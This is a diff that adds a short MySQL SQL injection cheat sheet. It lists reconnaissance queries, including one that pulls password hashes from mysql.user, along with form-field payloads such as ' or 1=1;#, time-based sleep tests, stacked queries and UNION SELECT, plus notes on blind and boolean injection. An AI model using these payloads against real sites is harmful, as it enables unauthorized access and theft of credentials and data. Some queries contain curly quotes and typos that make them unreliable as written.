@@ -1,0 +1,44 @@
+#################################################
+#	Attack on MySQL Database		#
+#################################################
+
+SELECT @@version		 			- Select the version
+SELECT 1; #comment 					- Comments
+SELECT /*comment*/1; 					- Comments
+SELECT user(); 						- Selects current user
+SELECT system_user(); 					- selects current user
+SELECT user FROM mysql.user;				- Lists users
+SELECT host, user, password FROM mysql.user; 		- List Password Hashes
+SELECT database();					- Current Database
+SELECT schema_name FROM information_schema.schemata; 	- List databases for MySQL >= v5.0
+SELECT distinct(db) FROM mysql.db			- List databases
+SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’	- List columns
+SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’	- List tables
+SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’	- Select a table where a column is named 'username'
+SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0; # rows numbered from 0	- Select Nth Row
+SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1; # rows numbered from 0	- Select Nth Row
+SELECT substr(‘abcd’, 3, 1); # returns c		- Selects the Nth Character
+SELECT 6 & 2; # returns 2 				- Bitwise AND
+SELECT 6 & 1; # returns 0				- Bitwise AND
+SELECT char(65); # returns A				- ASCII Value -> Char
+SELECT ascii(‘A’); # returns 65				- Char -> ASCII Value
+SELECT cast(’1′ AS unsigned integer);			- Casting
+SELECT cast(’123′ AS char);				- Casting
+
+#############################################
+# Attacks on particular fields in a form    #
+#############################################
+
+'		- By simplying adding a quotation, you can potentially discover whether SQL is being used as an error message may return
+' or 1=1;#	- Injecting this will provide an empty parameter and 1=1 which will be true and could potentially allow access or return data you seek
+' or sleep(5); 	- Another example of testing whether time based SQL exists as a pause will occur before the page returns your request
+' or 1=1; sleep(5);	- Stacking of queries
+' UNION SELECT [query]	- This allows for return of addition information from oter tables you may not have had access from before
+
+#################
+# Extras	#
+#################
+
+Blind SQL - Using the and command to confirm whether something is true or not. For example http://random_website/lol.php?id=2, and testing using 'and 1=1' or 'and 1=2' to attempt to verify whether or not the command is being executed
+
+Binary SQL - Involves using > and < in order to find the items. The 'where' clause of the SQL injection will attempt to gain information and true or false will be returned. This is useful when the database will only return 1 result and nothing more. For example: Select student FROM university WHERE firstname='john' and id > 100 could return true and then we have obtained data from the database, and through this we could eventually narrow it down to johns id being 125.
